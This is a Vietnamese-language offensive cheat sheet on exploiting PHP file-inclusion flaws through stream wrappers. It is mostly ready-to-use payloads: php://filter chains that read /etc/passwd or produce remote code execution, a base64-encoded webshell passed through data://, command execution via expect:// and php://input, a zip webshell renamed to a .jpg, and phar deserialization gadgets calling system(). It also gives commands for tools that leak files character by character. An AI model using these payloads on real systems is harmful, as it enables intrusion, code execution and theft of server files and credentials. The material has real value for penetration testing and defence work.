# Inclusion Using Wrappers (Chèn Tệp Sử Dụng Wrapper)

Wrapper trong ngữ cảnh của các lỗ hổng file inclusion đề cập đến giao thức hoặc phương thức được dùng để truy cập hoặc nhúng (include) một tệp. Wrapper thường được sử dụng trong PHP hoặc các ngôn ngữ phía server khác để mở rộng cách các hàm file inclusion hoạt động, cho phép sử dụng các giao thức như HTTP, FTP, và các giao thức khác ngoài hệ thống tệp cục bộ.

## Tóm tắt

- [Wrapper php://filter](#wrapper-phpfilter)
- [Wrapper data://](#wrapper-data)
- [Wrapper expect://](#wrapper-expect)
- [Wrapper input://](#wrapper-input)
- [Wrapper zip://](#wrapper-zip)
- [Wrapper phar://](#wrapper-phar)
    - [Cấu trúc PHAR Archive](#phar-archive-structure)
    - [PHAR Deserialization](#phar-deserialization)
- [Wrapper convert.iconv:// và dechunk://](#wrapper-converticonv-and-dechunk)
    - [Rò rỉ nội dung tệp từ error-based oracle](#leak-file-content-from-error-based-oracle)
    - [Rò rỉ nội dung tệp bên trong một định dạng đầu ra tùy chỉnh](#leak-file-content-inside-a-custom-format-output)
- [Tài liệu tham khảo](#references)

## Wrapper php://filter

Phần "`php://filter`" không phân biệt chữ hoa chữ thường

| Filter                                                       | Mô tả                                  |
| ------------------------------------------------------------ | -------------------------------------------- |
| `php://filter/read=string.rot13/resource=index.php`          | Hiển thị index.php dưới dạng rot13                   |
| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | Mã hóa index.php từ utf8 sang utf16          |
| `php://filter/convert.base64-encode/resource=index.php`      | Hiển thị index.php dưới dạng chuỗi mã hóa base64 |

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Các wrapper có thể được nối chuỗi (chained) với một wrapper nén dành cho các tệp lớn.

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

LƯU Ý: Các wrapper có thể được nối chuỗi nhiều lần bằng cách sử dụng `|` hoặc `/`:

- Nhiều lần base64 decode: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- deflate sau đó `base64encode` (hữu ích cho việc rò rỉ dữ liệu với số ký tự giới hạn): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

Ngoài ra còn có một cách để biến `php://filter` thành RCE hoàn chỉnh.

- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - Một CLI để tạo chuỗi PHP filter

  ```powershell
  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
  [+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
  ```

- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) để tạo một payload tùy chỉnh.

  ```powershell
  # vulnerable file: index.php
  # vulnerable parameter: file
  # executed command: id
  # executed PHP code: <?=`$_GET[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
  ```

## Wrapper data://

Payload được mã hóa base64 là "`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`".

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

Sự thật thú vị: bạn có thể kích hoạt một XSS và vượt qua Chrome Auditor với: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

## Wrapper expect://

Khi được sử dụng trong PHP hoặc một ứng dụng tương tự, nó có thể cho phép kẻ tấn công chỉ định các lệnh để thực thi trong shell của hệ thống, vì wrapper `expect://` có thể gọi các lệnh shell như một phần của đầu vào của nó.

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

## Wrapper input://

Chỉ định payload của bạn trong các tham số POST, điều này có thể được thực hiện bằng một lệnh `curl` đơn giản.

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

Ngoài ra, Kadimus có một module để tự động hóa cuộc tấn công này.

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

## Wrapper zip://

- Tạo một payload độc hại: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
- Nén tệp thành zip

  ```python
  zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
  ```

- Tải lên archive và truy cập tệp bằng wrapper:

  ```ps1
  http://example.com/index.php?page=zip://shell.jpg%23payload.php
  ```

## Wrapper phar://

### Cấu trúc PHAR archive

Các tệp PHAR hoạt động giống như tệp ZIP, khi bạn có thể sử dụng `phar://` để truy cập các tệp được lưu trữ bên trong chúng.

- Tạo một phar archive chứa một tệp backdoor: `php --define phar.readonly=0 archive.php`

  ```php
  <?php
    $phar = new Phar('archive.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
  ?>
  ```

- Sử dụng wrapper `phar://`: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`

### PHAR deserialization

:warning: Kỹ thuật này không hoạt động trên PHP 8+, tính năng deserialization đã bị loại bỏ.

Nếu một thao tác tệp hiện được thực hiện trên tệp phar hiện có của chúng ta thông qua wrapper `phar://`, thì metadata đã được tuần tự hóa (serialized) của nó sẽ bị giải tuần tự hóa (unserialized). Lỗ hổng này xảy ra trong các hàm sau, bao gồm cả file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, v.v.

Cách khai thác này yêu cầu ít nhất một class có các magic method như `__destruct()` hoặc `__wakeup()`.
Hãy lấy class `AnyClass` này làm ví dụ, nó thực thi tham số data.

```php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);
```

Chúng ta có thể tạo ra một phar archive chứa một object đã được tuần tự hóa trong phần meta-data của nó.

```php
// create new Phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add object of any class as meta data
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

Cuối cùng gọi wrapper phar: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`

LƯU Ý: bạn có thể sử dụng `$phar->setStub()` để thêm magic byte của tệp JPG: `\xff\xd8\xff`

```php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```

## Wrapper convert.iconv:// và dechunk://

### Rò rỉ nội dung tệp từ error-based oracle

- `convert.iconv://`: chuyển đổi đầu vào sang một dạng khác (`convert.iconv.utf-16le.utf-8`)
- `dechunk://`: nếu chuỗi không chứa ký tự xuống dòng, nó sẽ xóa toàn bộ chuỗi nếu và chỉ nếu chuỗi bắt đầu bằng A-Fa-f0-9

Mục tiêu của cách khai thác này là rò rỉ nội dung của một tệp, từng ký tự một, dựa trên bài viết [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py).

**Yêu cầu**:

- Backend không được sử dụng `file_exists` hoặc `is_file`.
- Tham số dễ bị tấn công cần nằm trong một request `POST`.
    - Bạn không thể rò rỉ nhiều hơn 135 ký tự trong một request GET do giới hạn kích thước

Chuỗi khai thác này dựa trên các PHP filter: `iconv` và `dechunk`:

1. Sử dụng filter `iconv` với một bảng mã (encoding) làm tăng kích thước dữ liệu theo cấp số nhân để kích hoạt lỗi bộ nhớ.
2. Sử dụng filter `dechunk` để xác định ký tự đầu tiên của tệp, dựa trên lỗi trước đó.
3. Sử dụng filter `iconv` lần nữa với các bảng mã có thứ tự byte khác nhau để hoán đổi các ký tự còn lại với ký tự đầu tiên.

Khai thác bằng cách sử dụng [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), script sẽ sử dụng hoặc `HTTP status code: 500` hoặc thời gian như một error-based oracle để xác định ký tự.

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

### Rò rỉ nội dung tệp bên trong một định dạng đầu ra tùy chỉnh

- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Tạo ra một chuỗi `php://filter` thêm một tiền tố và hậu tố vào nội dung của một tệp.

Để lấy được nội dung của một tệp nào đó, chúng ta muốn có: `{"message":"<file contents>"}`.

```ps1
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

Điều này có thể được sử dụng để chống lại đoạn mã dễ bị tấn công như sau.

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

### Rò rỉ nội dung tệp bằng blind file read primitive

- [ambionics/lightyear](https://github.com/ambionics/lightyear)

```ps1
code remote.py # edit Remote.oracle
./lightyear.py test # test that your implementation works
./lightyear.py /etc/passwd # dump a file!
```

## Tài liệu tham khảo

- [Baby^H Master PHP 2017 - Orange Tsai (@orangetw) - December 5, 2021](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
- [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - May 27, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
- [Introducing lightyear: a new way to dump PHP files - Charles Fol - November 4, 2024](https://web.archive.org/web/20250809094219/https://www.ambionics.io/blog/lightyear-file-dump)
- [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - December 11, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
- [It's A PHP Unserialization Vulnerability Jim But Not As We Know It - Sam Thomas - August 10, 2018](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [New PHP Exploitation Technique - Dr. Johannes Dahse - August 14, 2018](https://web.archive.org/web/20180817103621/https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [OffensiveCon24 - Charles Fol- Iconv, Set the Charset to RCE - June 14, 2024](https://youtu.be/dqKFHjcK9hM)
- [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - March 21, 2023](https://web.archive.org/web/20260228090126/https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
- [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - October 18, 2022](https://web.archive.org/web/20260212042712/https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
- [Solving "includer's revenge" from hxp CTF 2021 without controlling any files - @loknop - December 30, 2021](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
